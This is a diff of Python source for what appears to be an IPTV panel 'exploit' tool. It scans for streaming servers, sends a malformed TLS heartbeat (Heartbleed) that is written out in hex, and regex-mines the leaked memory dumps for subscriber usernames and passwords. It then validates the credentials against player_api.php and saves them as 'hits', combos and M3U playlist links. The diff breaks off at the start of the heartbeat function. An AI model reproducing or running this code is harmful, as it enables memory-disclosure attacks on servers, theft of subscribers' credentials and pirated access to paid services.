+            timezone = timezone.replace('Pacific/Ponape', '🇫🇲Ponape[FM]')
+            timezone = timezone.replace('Pacific/Port_Moresby', '🇵🇬Port Moresby[PG]')
+            timezone = timezone.replace('Pacific/Rarotonga', '🇨🇰Rarotonga[CK]')
+            timezone = timezone.replace('Pacific/Saipan', '🇲🇵Saipan[MP]')
+            timezone = timezone.replace('Pacific/Samoa', '🇼🇸Samoa[WS]')
+            timezone = timezone.replace('Pacific/Tahiti', '🇵🇫Tahiti[PF]')
+            timezone = timezone.replace('Pacific/Tarawa', '🇰🇮Tarawa[KI]')
+            timezone = timezone.replace('Pacific/Tongatapu', '🇹🇴Tongatapu[TO]')
+            timezone = timezone.replace('Pacific/Truk', '🇫🇲Truk[FM]')
+            timezone = timezone.replace('Pacific/Wake', '🇺🇸Wake[US]')
+            timezone = timezone.replace('Pacific/Wallis', '🇼🇫Wallis[WF]')
+            timezone = timezone.replace('Pacific/Yap', '🇫🇲Yap[FM]')
+            timezone = timezone.replace('Poland', '🇵🇱Poland[PL]')
+            timezone = timezone.replace('Portugal', '🇵🇹Portugal[PT]')
+            timezone = timezone.replace('ROC', '🇹🇼Taiwan[TW]')
+            timezone = timezone.replace('ROK', '🇰🇷South Korea[KR]')
+            timezone = timezone.replace('Singapore', '🇸🇬Singapore[SG]')
+            timezone = timezone.replace('UCT', '🌐UCT')
+            timezone = timezone.replace('US/Alaska', '🇺🇸Alaska[US]')
+            timezone = timezone.replace('US/Aleutian', '🇺🇸Aleutian[US]')
+            timezone = timezone.replace('US/Arizona', '🇺🇸Arizona[US]')
+            timezone = timezone.replace('US/Central', '🇺🇸Central[US]')
+            timezone = timezone.replace('US/East-Indiana', '🇺🇸East Indiana[US]')
+            timezone = timezone.replace('US/Eastern', '🇺🇸Eastern[US]')
+            timezone = timezone.replace('US/Hawaii', '🇺🇸Hawaii[US]')
+            timezone = timezone.replace('US/Indiana-Starke', '🇺🇸Indiana-Starke[US]')
+            timezone = timezone.replace('US/Michigan', '🇺🇸Michigan[US]')
+            timezone = timezone.replace('US/Mountain', '🇺🇸Mountain[US]')
+            timezone = timezone.replace('US/Pacific', '🇺🇸Pacific[US]')
+            timezone = timezone.replace('US/Samoa', '🇺🇸Samoa[US]')
+            timezone = timezone.replace('UTC', '🌐UTC')
+            timezone = timezone.replace('Universal', '🌐Universal')
+            timezone = timezone.replace('W-SU', 'W-SU')
+            timezone = timezone.replace('WET', 'WET')
+            timezone = timezone.replace('Zulu', 'Zulu')
+            hitData.timezone = timezone
+            realm = reponseMessage.split('url":')[1]
+            realm = realm.split(',')[0]
+            realm = realm.replace('"', "")
+            hitData.real = realm
+            port = reponseMessage.split('port":')[1]
+            port = port.split(',')[0]
+            port = port.replace('"', "")
+            hitData.port = port
+            outputFormats = reponseMessage.split('output_formats":')[1]
+            outputFormats = outputFormats.split('"]}')[0]
+            outputFormats = outputFormats.replace('","', ', ')
+            outputFormats = outputFormats.replace('["', '')
+            hitData.outputFormats = outputFormats
+            timeInfo = reponseMessage.split('exp_date":')[1]
+            timeInfo = timeInfo.split(',')[0]
+            timeInfo = timeInfo.replace('"', "")
+            if timeInfo == "null":
+                hitData.caducidad = "#𝖀𝖓𝖑𝖎𝖒𝖎𝖙𝖊𝖉"
+            else:
+                hitData.caducidad = (datetime.datetime.fromtimestamp(int(timeInfo)).strftime('%d.%b.%Y %H:%M'))
+
+        except Exception as err:
+            print("Error ao tentar achar os canais:", err)
+    #creamos la url para solicitar la lista y devolvemos la invocacion a la url, que sera la lista de canales
+    def extractChannelListM3U_FromUSER_PASS(self, panel, user, passw):
+        url="http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_live_categories"
+        print("Extraindo lista de canais: ",url)
+        try:
+            ses=requests.session()
+            res = ses.get(url, headers=self.getHeaderM3U_withHOST(panel), timeout=15, verify=False)
+            return self.createChannelList(str(res.text))
+        except Exception as errp:
+            return "Error ao tentar achar os canais:",errp
+
+    # crea una lista de los canales recibidos
+    def createChannelList(self, listlink):
+        # si existen varios datos de canales, creo una lista
+        canal = ""
+        categoria = ""
+        if listlink.count('category_name":"') > 1:
+            for i in listlink.split('category_name":"'):
+                try:
+                    canal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/', '/')
+                    
+                    canal = canal.replace('[', '')
+                except:
+                    canal = ""
+                categoria = categoria + canal + "«○»"
+                categoria = categoria.replace('{«○»','')
+            return categoria
+        else:
+            return " No data "
+
+def separarUserPass(entrada:str):
+    try:
+        protocolo="http"
+        if (entrada.find("https"))>=0:
+            protocolo="https"
+        entrada = entrada.replace("/", "")
+        separador = "get.php"
+        separado = entrada.split(separador)
+        url = separado[0].replace("https:", "")
+        url = url.replace("http:", "")
+        separador = "username="
+        separado = entrada.split(separador)
+        separado = separado[1].split("password=")
+        user = separado[0].replace("&","")
+        separado = separado[1].split("&")
+        password = separado[0]
+        return protocolo,url,user, password
+    except:
+        return ""
+
+
+#metodo que verifica una url entera formato m3u con user y pass, le paso un id de canal que debe existir, no es extraer el servidor multimedia
+def checkFullM3U_URL(entradaURL:str,_session):
+    protocolo,url,user,passw=separarUserPass(entradaURL)
+    urlEntrada=url
+    #check real url for play a channel
+    urlPlayerInfo = "http://" + url + "/player_api.php?username=" + str(user) + "&password=" + str(passw)
+    print("Tentandoi obter informações de: ",urlPlayerInfo)
+    try:
+        res = _session.get(urlPlayerInfo, headers=hea3(url), timeout=(5, 15), allow_redirects=False, stream=True)
+        if res.status_code==200:
+            datos=json.loads(res.text)
+            if (datos["user_info"]["auth"]==0):
+                return "KO","","",""
+            urlReal=datos["server_info"]["url"]+":"+datos["server_info"]["port"]
+            urlReal=urlReal.replace("https://","")
+            urlReal = urlReal.replace("http://", "")
+            url=urlReal
+            puerto=datos["server_info"]["port"]
+            return "OK","","",""
+        else:
+            return "KO","","",""
+    except Exception as errp:
+        print("error intentado accedes al servidor como m3u:",errp)
+        return "KO", "", "", ""
+
+def hea3(panel):
+    hea = {
+        "Icy-MetaData": "1",
+        "User-Agent": "Lavf/57.83.100",
+        "Accept-Encoding": "identity",
+        "Host": panel,
+        "Accept": "*/*",
+        "Range": "bytes=0-",
+        "Connection": "close",
+    }
+    return hea
+# ---------------------------------------------M3U_UTILS--------------------------------------------------
+#clase encargada de escribir los ficheros de volcado de la memoria a disco
+class OutputFileWriter:
+    nombreBase:str
+    maxSizeperFile:int
+    nombreActual:str
+    contador:int
+
+    def __int__(self, _nombreBase:str):
+        self.nombreBase=_nombreBase
+        self.nombreActual=self.nombreBase
+        self.contador+=1
+    def initValues(self,serverURL):
+        self.nombreBase=serverURL.replace(":","_")
+        self.nombreBase = self.nombreBase.replace(".", "_")
+        self.nombreActual=self.nombreBase
+        self.contador=1
+
+    def writeToFile(self,entrada:str):
+        try:
+            nombreFICHERO=rootDir+"/debug/" + self.nombreActual + ".txt"
+            fichero=open(nombreFICHERO,"a")
+            file_size = os.path.getsize(nombreFICHERO)
+            if (file_size / 1024) > 3000:  # para dividir el fichero de entrada en trozos
+                self.nombreActual = self.nombreBase + "_"+str(self.contador)
+                self.contador+=1
+                fichero = open(rootDir+"/debug/"+self.nombreActual+".txt", "a")
+            fichero.write(entrada)
+            fichero.close()
+        except Exception as errp:
+            print("Error writing to DUMP output file:",errp)
+#---------------------------------------------SCANPORTS--------------------------------------------------
+    
+#Clase encargada de almacenar los datos para un esquema productor/consumidor
+class DataContainer:
+    colaFifo:PriorityQueue
+    lock
+    def __init__(self):
+        self.colaFifo = PriorityQueue()
+        self.lock = threading.Lock()
+
+    def put(self,entrada):
+        self.lock.acquire()
+        self.colaFifo.put(entrada)
+        self.lock.release()
+    def get(self):
+        return self.colaFifo.get()
+
+#---------------------------------------------DatosServerM3U---------------------------------------------
+class DatosServerM3U:
+
+    puertoBaseSERVER=0
+    host=""
+    panelM3u=""
+    protocoloSERVER= "http"
+    canal=""
+    panelHost=""
+    panelProtocolo="http"
+    m3uURL=""
+    panelPuerto=0
+    misHeaders = {
+        'Accept': '*/*',
+        'Accept-Language': 'es',
+        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
+        'Range': 'bytes=0-'
+    }
+    def printInfoServer(self):
+        print("Host del panel-->", self.panelHost)
+        print("Puerto del Panel--->",self.panelPuerto)
+        print("Puerto del Server--->", self.puertoBaseSERVER)
+        print("\tURL del panel-->",self.m3uURL)
+        if self.puertoBaseSERVER==None:
+            self.puertoBaseSERVER=80
+        print("\tservidor final:", self.protocoloSERVER+"://"+self.host+":"+str(self.puertoBaseSERVER))
+        print("\tHost Servidor Final-->", self.host)
+        print("\tServidor Final protocolo-->", self.protocoloSERVER)
+        print("\tCanal utilizado-->", self.canal)
+
+    def __str__(self):
+        return self.panelProtocolo+"://"+self.panelHost+"--->"+self.protocoloSERVER+"://"+self.host+":"+str(
+            self.puertoBaseSERVER)
+    #Lee la lista m3u de entrada, si tiene _plus al final lo quita, solo aceptamos ese formato
+    def extraerCanalFromM3U(self,_m3u:str):
+        try:
+            _m3u=_m3u.replace("_plus","")
+            m3u8_obj = m3u8.load(_m3u,headers=self.misHeaders)
+            playlist = [el['uri'] for el in m3u8_obj.data['segments']]
+            sesion = requests.Session()
+            canal = playlist[50]
+            return canal
+        except Exception as errp:
+            print("\33[31mError accediendo a la m3u(verificar que llegamos)\33[0m:",errp)
+            return ""
+
+    #Se le pasa una m3u como parametro, para hacer la busqueda del servidor multimedia final
+    def extraerServerFinal(self,_m3uURL):
+        try:
+            canal=self.extraerCanalFromM3U(_m3uURL)
+            self.m3uURL=_m3uURL
+            if canal!="":
+                panelParser=urlparse(_m3uURL)
+                self.panelHost=panelParser.netloc.split(":")[0] #si tiene puerto se lo quito
+                self.panelProtocolo=panelParser.scheme
+                self.panelPuerto=panelParser.port
+                sesion=requests.Session()
+                respuesta = sesion.get(url=canal, stream=False, allow_redirects=False)
+                self.canal=canal
+                if 'Location' in respuesta.headers:
+                    miparser=urlparse(respuesta.headers["Location"])
+                    self.panelM3u=_m3uURL
+                    self.host=miparser.hostname
+                    self.puertoBaseSERVER=miparser.port
+                    self.protocoloSERVER=miparser.scheme
+                    return self
+            #no tiene redireccion, para los datos directos de la m3u o es una ip solo
+            miparser = urlparse(_m3uURL)
+            self.panelM3u = _m3uURL
+            if miparser.hostname==None:
+                self.host=_m3uURL
+                self.panelHost = _m3uURL
+            else:
+                self.host = miparser.hostname
+                self.panelHost = miparser.hostname
+            if miparser.port==None:
+                self.puertoBaseSERVER=80
+                self.panelPuerto=80
+            else:
+                self.puertoBaseSERVER = miparser.port
+                self.panelPuerto= miparser.port
+            if miparser.scheme==None:
+                self.panelProtocolo = ""
+                self.protocoloSERVER = ""
+            else:
+                self.panelProtocolo=miparser.scheme
+                self.protocoloSERVER=miparser.scheme
+            return self
+        except Exception as errp:
+            print("Error:",errp)
+
+    def __eq__(self, other):
+        return self.m3uURL == other.m3uURL
+
+    def __gt__(self, other):
+        return self.m3uURL > other.m3uURL
+
+#Clase encargada de analizar los flujos de entrada, buscando los patrones conocidos y extraer asi los user/pass
+#Tambien genera las url m3u validas para esos usuarios
+#Esta clase hace de consumidor
+class DataAnalyzer:
+    miDataContainer:DataContainer
+    patronURL_USERNAME_PASSWORD= "username=[A-z0-9_*!¡@$?¿:\-\.@]*\&password=[A-z0-9_*!¡@$?¿:\-\.@]*"
+    patronLISTACANAL_M3U="https?:\/[\/A-z0-9_*!¡@$?.%¿:\-]{3,}"#https?://([A-z0-9_*!¡@$?.%¿:\-]*/){3,}([A-z0-9_*!¡@$?.%¿:\-]*)
+    patronREQUEST_URI = "username=([A-z0-9_*!¡@$?¿:\-\.@]*\&password=[A-z0-9_*!¡@$?¿:\-\.@]*)(REQUEST_METHOD)"
+    patronTOKEN="https?:\/\/[A-z0-9_*!¡@$?.%¿:\/]{4,}\/[A-z0-9_*!¡@$?.%¿:\-]*token"
+    patronLIVE= "live\/[A-z0-9_*!¡@$?.%¿:\-]{2,}\/[A-z0-9_*!¡@$?¿\-]{2,}"
+    patronEXTINF="\/([A-z0-9_*!¡@$?.%¿:\-]*/){4,}([A-z0-9_*!¡@$?.%¿:\-]*)#EXTINF"
+    contenedorUSER_PASS:dict
+    urlBASE=""
+    protocoloBase=""
+    puertoBase=""
+    primeraVez=True
+    nombreFicheroCombos=""
+    miDS:DatosServerM3U
+
+    #Metodo para almacenar los datos basicos del server a atacar e inicializar datos de ataque. con estos datos se contruyen las listas
+    def setURLBase(self,_miDS:DatosServerM3U):
+        self.urlBASE = _miDS.panelHost
+        self.protocoloBase = _miDS.panelProtocolo
+        self.puertoBase = _miDS.panelPuerto
+        self.nombreFicheroCombos = (rootDir + "/Hits/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐂𝐎𝐌𝐁𝐎/" + "COMBO_" + self.urlBASE.replace(".", "_").replace(":","_") + ".txt")
+        self.miDS=_miDS
+
+    def validarM3U(self,entrada: str):
+        HEADER1_m3u ={
+        "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
+        "X-User-Agent": "Model: MAG254; Link: Ethernet",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
+    }
+        miM3U_UTILS=M3U_UTILS()
+        protocolo, url, user, passw = separarUserPass(entrada)
+        salida = entrada.replace("get.php", "player_api.php")
+        session = requests.Session()
+        print("Invoking: "+salida)
+        try:
+            miHitData = HitData()
+            respuesta = session.get(url=salida,headers=HEADER1_m3u, timeout=5)
+            datosLista=respuesta.json()
+            if (respuesta.status_code == 200) and (datosLista['user_info']['auth']!=0):
+                    #miPortalScanner = PortalScanner("", "", 1, "", False, "", 0)
+                    valorScanner, urlServer, puerto, procolo = checkFullM3U_URL(entrada, session)
+                    if ((valorScanner.find("OK") >= 0) or (valorScanner.find("KOK") >= 0)):
+                        if (valorScanner.find("KOK") >= 0):
+                            miHitData.m3uValid = "𝑶𝑭𝑭𝑳𝑰𝑵𝑬🖤"
+                        else:
+                            miHitData.m3uValid = "𝗔𝗖𝗧𝗜𝗩𝗘💚"
+                    miHitData.real = url
+                    miHitData.url = url
+                    miHitData.nick = nick
+                    miHitData.m3uURL = entrada
+                    miM3U_UTILS.extractDataFromList(user, passw, respuesta.text, url, miHitData)
+                    listaCanales=miM3U_UTILS.extractChannelListM3U_FromUSER_PASS(url, user, passw)
+                    miHitData.livelist=listaCanales
+                    return miHitData
+            else:
+                    #if datosLista['user_info']['auth']==0: #lista no activa, pero era valida, baneada? caducada?
+                    return ""
+
+        except Exception as errp:
+            print("Erro ao analisar o URL:", errp)
+            return ""
+        print(respuesta.text)
+
+    #Escribe los combos que se van encontrado, el nombre del fichero es el nombre del servidor
+    def writeComboToFile(self,user,passw):
+        try:
+            fichero = open(self.nombreFicheroCombos, "a")
+            fichero.write(user+":"+passw)
+            fichero.write("\n")
+            fichero.close()
+        except Exception as errp:
+            cadena = "\33[31;40mErro ao gravar no arquivo Combo" + errp + "\33[0m"
+
+            print (cadena)
+
+    #lee el combo generado en ejecuciones anteriores, con estos datos evitamos repeticion de listas en distintas ejecucione
+    def readComboFromFile(self,miDiccionario:dict):
+        try:
+                if os.path.exists(self.nombreFicheroCombos) == True:
+                    texto = "\33[30;47mLendo arquivo de combo anterior _" + self.nombreFicheroCombos + "\33[0m"
+                    with open(self.nombreFicheroCombos, 'r')  as f:
+                        # Leer todas las líneas del fichero
+                        lines = f.readlines()
+
+                    for line in lines:
+                        # Separar la línea en clave y valor utilizando los dos puntos como separador
+                        key, value = line.split(':')
+                        # Añadir la clave y el valor al diccionario
+                        miDiccionario[key] = value
+
+                    texto = "\33[30;47mTotal de combos gerados _" + str(len(self.contenedorUSER_PASS)) + "\33[0m"
+                    print(texto)
+
+        except Exception as errp:
+            print("\33[31mErro ao ler arquivo de combo " + self.nombreFicheroCombos + " => " + errp + "\33[0m")
+
+    #metodo que genera la m3u y graba los HITs a los distintos ficheros
+    def generateURL_m3u(self, _user,passw):
+        global hitc
+        try:
+            hitc=hitc+1
+            print("\33[32m\n       ✦ ℍ 𝐈 𝕋 - 𝐄 𝕏 𝐏 𝕃 𝐎 𝕀 𝐓 ✦       \n\n\33[0mUSER:PASS: \33[32m"+_user+":"+passw+"\33[33m\n")
+            if (self.puertoBase!="") and (self.puertoBase!=None): #verificamos que tenga puerto la url
+                urlM3U=self.protocoloBase+"://"+self.urlBASE+":"+str(self.puertoBase)+"/get.php?username="+_user+"&password="+passw+"&type=m3u_plus"
+            else:
+                urlM3U = self.protocoloBase + "://" + self.urlBASE + "/get.php?username=" + _user + "&password=" + passw + "&type=m3u_plus"
+
+            nombreFricheroM3U_OK=(rootDir+"/HITS/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐇𝐈𝐓𝐒/✦𝐄𝐗{"+self.urlBASE.replace(".","_").replace(":","_")+"}#"+nick+"{Hits}.txt")
+            nombreFricheroM3U_LISTA=(rootDir+"/HITS/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐌𝟑𝐔/✦𝐄𝐗{"+self.urlBASE.replace(".","_")+"}#"+nick+"{M3u}.txt")
+            nombreFricheroM3U_COMBO = (rootDir + "/HITS/𝐄𝐱𝐩𝐥𝐨𝐢𝐭/𝐂𝐎𝐌𝐁𝐎/✦𝐄𝐗{" + self.urlBASE.replace(".", "_").replace(":","_") + "}#"+nick+"{Combo}.txt")
+
+            ficheroCOMBO=open(nombreFricheroM3U_COMBO,"a", encoding="utf8")
+            ficherFULL=open(nombreFricheroM3U_OK,"a", encoding="utf8")
+            fichero_nombreFricheroM3U_COMBO=open(nombreFricheroM3U_LISTA,"a", encoding="utf8")
+
+            if (self.primeraVez):#fecha de ejecucion, solo la primera vez en cada ejecucion
+                self.primeraVez = False
+                ficherFULL.write(""+time.asctime()+"")
+            miHidata=self.validarM3U(urlM3U)
+            if miHidata!='':
+                ficherFULL.write(str(miHidata))
+                ficherFULL.write("\n")
+                ficherFULL.close()
+                ficheroCOMBO.write(_user+":"+passw+"\n")
+                ficheroCOMBO.close()
+                fichero_nombreFricheroM3U_COMBO.write(miHidata.m3uURL+"\n")
+                fichero_nombreFricheroM3U_COMBO.close()
+                fichero_nombreFricheroM3U_COMBO.close()
+                return miHidata
+        except Exception as errp:
+            print("\33[31mError writing to the HITS file!!!!!\33]0m",errp)
+            quit()
+
+    def extractDataRequestEXTINF(self,entrada:str):
+        try:
+            datos = entrada.split("/")
+            user = datos[3]
+            passw = datos[4]
+            return user, passw
+        except Exception as errp:
+            cadena = "\33[31;40mErro ao processar extração de dados de REQUEST_EXTINF:" + errp + " dados de entrada:" + entrada + "\33[0m"
+            print(cadena)
+            return "", ""
+    def extractDataRequestLIVE(self,entrada:str):
+        try:
+            datos = entrada.split("/")
+            user = datos[1]
+            passw = datos[2]
+            return user, passw
+        except Exception as errp:
+            cadena = "\33[31;40mErro ao processar extração de dados de REQUEST_LIVE:" + errp + " dados de entrada:" + entrada + "\33[0m"
+            print(cadena)
+            return "", ""
+    def extractDataRequestTOKEN(self, entrada: str):
+        try:
+            datos = entrada.split("/")
+            user = datos[3]
+            passw = datos[4]
+            return user, passw
+        except Exception as errp:
+            cadena = "\33[31;40mErro ao processar extração de dados de REQUEST_TOKEN:" + errp + " dados de entrada:" + entrada + "\33[0m"
+            print(cadena)
+            return "", ""
+    def extractDataREQUEST_URI(self, entrada:str):
+        try:
+            datos = entrada.split("/")
+            user = datos[1]
+            passw = datos[2]
+            return user, passw
+        except Exception as errp:
+            cadena = "\33[31;40mErro ao processar extração de dados de REQUEST_URL:" + errp + " dados de entrada:" + entrada + "\33[0m"
+            print(cadena)
+            return "", ""
+    def extractData_URL_USERNAME_PASSWORD(self, _entrada: str):
+        try:
+            entrada=_entrada.split("REQUEST")#eliminamos si viene request
+            datos = _entrada.split("username=")
+            salida = (datos[1].split("&password="))
+            user = salida[0]
+            passw = salida[1]
+            return user, passw
+        except Exception as errp:
+            cadena = "\33[31;40mErro ao processar extração de dados de REQUEST_LOGIN:" + errp + " dados de entrada:" + entrada + "\33[0m"
+            return "", ""
+    def extractData_LISTACANAL_m3u(self,entrada):
+        try:
+            datos=entrada.split("/")
+            user = datos[3]
+            passw = datos[4]
+            return user,passw
+        except:
+            return "",""
+
+    def setDataContainer(self,_dataC:DataContainer):
+        self.miDataContainer=_dataC
+
+    def setCombosCotainer(self,_miDictCombos:dict):
+        self.contenedorUSER_PASS=_miDictCombos
+
+    #Borrar al distribuir
+    def writeDebugCode(self,entrada):
+        try:
+            print(entrada)
+            fichero=open(".\debug2\\trazas.txt","a")
+            fichero.write("\n"+entrada)
+        except:
+            False
+
+    #metodo que graba a disco los resultados,modificar esta parte si se quiere hacer algo mas con los HITs de user pass
+    def tratarUsuario(self,user, passw):
+        lock.acquire()
+        if (user != ""):
+            cadena = """
+\33[30;100m   ★     ★     ★     ★     ★     ★       \33[0m
+
+   ╭─❪❪ 𝕏 ℳ𝟛Ʋ ϻคx ❦ Є✘ρƖοιτ 𝕏 ❫❫ 
+   │✪ \33[36mSᴛᴀʀᴛTɪᴍᴇ➪ \33[33m"""+str(hora_ini)+""" \33[0m
+   │✪ \33[32mPᴀɴᴇʟ➪ \33[36m"""+self.urlBASE+"""  \33[0m
+   │✪ \33[33mUsᴇʀ:Pᴀss➪ \33[32m"""+user+""":"""+passw+"""  \33[0m
+   │✪ \33[32mTᴏᴛᴀʟ➪ \33[35m"""+str(self.miDataContainer.colaFifo.qsize())+""" \33[0m
+   │✪ \33[32m"""+threading.current_thread().name+""" \33[0m \33[96mIᴅ Coᴍʙo➪ \33[31m"""+str(id(self.contenedorUSER_PASS))+""" \33[0m
+   │✪ \33[34mʜɪᴛs ʙʏ➪ \33[96m"""+str(nick)+""" 👑  \33[0m
+   ╰─❫❫\33[36mSᴄᴀɴTɪᴍᴇ➪\33[33m """+str(time.strftime('%H:%M:%S'))+""" \33[93mHɪTꜱ➪ """+str(hitc)+"""
+\33[0m
+\33[30;100m      𝕏 Uʟᴛʀᴀ ℳ𝟛Ʋ ϻคx Є✘ρƖοιτ 𝕏        \33[0m"""
+            print(cadena)
+            if str(self.contenedorUSER_PASS.get(user)) == "None":
+                self.contenedorUSER_PASS[user] = passw
+                miHitData=self.generateURL_m3u(user, passw)
+                self.writeComboToFile(user, passw) #fichero para no repetir los combos encontrados, no es el mismo de hits
+            else:
+                cadena = "\n\33[37m Benutzer: \33[31mActive..." + "\33[0m\n User Pass: " + "\33[32m" + user + ":" + passw + "\33[0m\n"
+                print(cadena)
+        lock.release()
+    #Metodo principal de analisis, extrae datos del contenedor, los analiza, compara con los patrones, extrae los user/pass y genera en fichero la m3u valida
+    def doAnalyze(self):
+        cadena = "\n Iniciando Consumidor: " + "\33[31m" + str(id(self)) + "\33[0m\n ID do Container: " + "\33[33m" + str(id(self.miDataContainer)) + "\33[0m\n ID do Container de Combos: " + "\33[31m" + str(id(self.contenedorUSER_PASS)) + "\33[0m"
+        print(cadena)
+        while(True):
+            user = ""
+            passw = ""
+            datos=self.miDataContainer.get()
+            resultado = re.findall(self.patronLISTACANAL_M3U, datos)
+            if (debug):
+                print("Analisando dados do container... tamanho extraído:", len(datos))
+            if (len(resultado) > 0):  # encontrado
+                if (debug):
+                    cadena = "\33[32midiot boss LISTACANAL_M3U => " + datos + "\33[0m"
+
+                    self.writeDebugCode(cadena+"\n\t"+datos)
+                for elemento in resultado:
+                    user, passw = self.extractData_LISTACANAL_m3u(elemento)
+                    self.tratarUsuario(user, passw)
+            resultado=re.findall(self.patronURL_USERNAME_PASSWORD, datos)
+            if (len(resultado)>0):#encontrado
+                if (debug):
+                    cadena= "\33[32midiot boss URL_USERNAME_PASSWORD => "+datos+"\33[0m"
+                    self.writeDebugCode(cadena+"\n\t"+datos)
+                for elemento in resultado:
+                    user, passw = self.extractData_URL_USERNAME_PASSWORD(elemento)#esta expresion esta formada por dos segmentos regex
+                    self.tratarUsuario(user,passw)
+            resultado=re.search(self.patronEXTINF,datos)
+            if (resultado!=None):
+                if (debug):
+                    cadena =  "\33[32midiot boss EXTINF => " + datos + "\33[0m"
+                    self.writeDebugCode(cadena+"\n\t"+datos)
+                for elemento in resultado:
+                    user, passw = self.extractDataRequestEXTINF(elemento)
+                    self.tratarUsuario(user, passw)
+            resultado=re.findall(self.patronREQUEST_URI,datos)
+            if (len(resultado) > 0):  # encontrado
+                if (debug):
+                    cadena =  "\33[32midiot boss REQUEST_URI => " + datos + "\33[0m"
+                    self.writeDebugCode(cadena+"\n\t"+datos)
+                for elemento in resultado:
+                    user, passw = self.extractDataREQUEST_URI(elemento)
+                    self.tratarUsuario(user, passw)
+            resultado=re.findall(self.patronTOKEN,datos)
+            if (len(resultado) > 0):  # encontrado
+                for elemento in resultado:
+                    user, passw = self.extractDataRequestTOKEN(elemento)
+                    self.tratarUsuario(user, passw)
+                if (debug):
+                    cadena =  "\33[32midiot boss TOKEN => " + datos + "\33[0m"
+                    self.writeDebugCode(cadena+"\n\t"+datos)
+            resultado = re.findall(self.patronLIVE, datos)
+            if (len(resultado) > 0):  # encontrado
+                for elemento in resultado:
+                    user, passw = self.extractDataRequestLIVE(elemento)
+                    self.tratarUsuario(user, passw)
+                if (debug):
+                    cadena =  "\33[32midiot boss LIVE => " + datos + "\33[0m"
+                    self.writeDebugCode(cadena+"\n\t"+datos)
+
+class DataOutputGenerator:
+    False
+
+class PanelAttack_SSL:
+    miProductor:DataContainer
+    # mensaje para inicar la conversacion SSL
+    hello = ''' 
+            16 03 02 00  dc 01 00 00 d8 03 02 53
+            43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
+            bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
+            00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
+            00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
+            c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
+            c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
+            c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
+            c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
+            00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
+            03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
+            00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
+            00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
+            00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
+            00 0f 00 01 01                                  
+            '''
+    hb = ''' 
+            18 03 02 00 03
+            01 40 00
+            '''
+    miOutputFileWriter:OutputFileWriter
+    puertoINICIO_SCAN=_puertoINICIO_SCAN
+    puertoFIN_SCAN=_puertoFIN_SCAN
+    primeraVEZ_VULNERABLES=True
+
+    def setDataContainer(self,_dataC:DataContainer):
+        self.miProductor=_dataC
+
+    def decoceStringToHEX(self,entrada):
+        return decode_hex(entrada.replace(' ', '').replace('\n', ''))[0]
+
+#def hexdump(s):
+#    # print("*********",s)
+#    for b in range(0, len(s), 16):
+#        lin = [c for c in s[b: b + 16]]
+#        hxdat = ' '.join('%02X' % c for c in lin)
+#        pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
+#        print('  %04x: %-48s %s' % (b, hxdat, pdat))
+
+    def hexdump(self, s):
+        #print("",s)
+        for b in range(0, len(s), 16):
+            lin = [c for c in s[b: b + 16]]
+            hxdat = ' '.join('%02X' % c for c in lin)
+            pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
+            print('  %04x: %-48s %s' % (b, hxdat, pdat))
+
+    def recvall(self,s, length, timeout=5):
+        endtime = time.time() + timeout
+        rdata = b''
+        try:
+            remain = length
+            while remain > 0:
+                rtime = endtime - time.time()
+                if rtime < 0:
+                    return None
+                r, w, e = select.select([s], [], [], 5)
+                if s in r:
+                    data = s.recv(remain)
+                    # EOF?
+                    if not data:
+                        return None
+                    rdata += data
+                    remain -= len(data)
+            return rdata
+        except Exception as errp:
+            if  (debug):
+                print("recvall--->error leyendo datos del socket", errp)
+            return None
+
+
+    def recvmsg(self, s):
+        hdr = self.recvall(s, 5)
+        if hdr is None:
+            if debug:
+                print('HDR Unexpected EOF receiving record header - server closed connection')
+            return None, None, None
+        typ, ver, ln = struct.unpack('>BHH', hdr)
+        pay = self.recvall(s, ln, 10)
+        if pay is None:
+            if (debug):
+                print('\t\tpayload Unexpected EOF receiving record payload - server closed connection')
+            return None, None, None
+        # print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
+        return typ, ver, pay
+
+
+#    def hit_hb(s,_url,_port):
+#        data = decoceStringToHEX(hb)
+#        s.send(data)
+#        while True:
+#            typ, ver, pay = self.recvmsg(s)
+#            if typ is None:
+#                print('\t\tNo HB response received, server likely not vulnerable')
+#                return False
+#            if typ == 24:
+#                if debug:
+#                    print('\t\tReceived HB response:')
+#                if (debug):
+#                    self.hexdump(pay)
+#                if len(pay) > 3:
+#                    puerto=str(_port)
+#                    cadena=Fore.GREEN+'\t\t\tServer is vulnerable!-->'+_url+":"+puerto+ Fore.RESET
+#                    print(cadena)
+#                else:
+#                    print('\t\tServer processed malformed data-hello-, but did not return any extra data.')
+#                return True
+#            if typ == 21:
+#                print('\t\tReceived alert:')
+#                if (debug):
+#                    self.hexdump(pay)
+#                print('\t\tServer returned error, likely not vulnerable')
+#                return False
+
+    def hit_hb(self,s):
